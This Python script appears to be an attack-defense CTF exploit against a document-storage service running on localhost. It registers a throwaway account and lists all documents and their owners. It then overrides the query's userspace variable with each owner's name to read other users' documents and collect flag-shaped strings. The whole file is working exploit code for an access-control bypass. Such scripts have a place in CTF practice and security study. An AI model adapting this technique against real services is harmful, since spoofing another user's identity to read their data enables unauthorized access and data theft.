import random
import re
import requests
import string

URL = "http://localhost:8081/"


def get_token():
    resp = requests.post(URL + "welcome", json={
        "login": ''.join(random.choice(string.ascii_letters) for _ in range(10)),
        "password": ''.join(random.choice(string.ascii_letters) for _ in range(10))
    })
    return resp.text


def get_doc_with_user(token):
    ql = '''
    @doc <- {(0, 100) -> list};
    {(@doc) -> result};
    '''
    data = {
        "token": token,
        "query": ql
    }

    resp = requests.post(URL, json=data)
    a = resp.text
    body = resp.json()
    doc_with_user = []
    for pair in body["body"].strip().split("\n"):
        doc, user = pair.split(":")[0].strip(), pair.split(":")[1].strip()
        doc_with_user.append((doc, user))
    return doc_with_user


def get_flags(token):
    doc_with_user = get_doc_with_user(token)
    flags = []
    for d, u in doc_with_user:
        userspace = f'@userspace <- "{u}";'
        doc = '@doc <- {(' + d + ') -> get};'
        res = '{(@doc) -> result};'
        ql = userspace + doc + res
        data = {
            "token": token,
            "query": ql
        }
        resp = requests.post(URL, json=data)
        body = resp.json()
        finds = re.findall(r'\w{31}=', body["body"])
        if finds:
            flags += finds
    return flags


def main():
    token = get_token()
    print(get_flags(token))


if __name__ == "__main__":
    main()
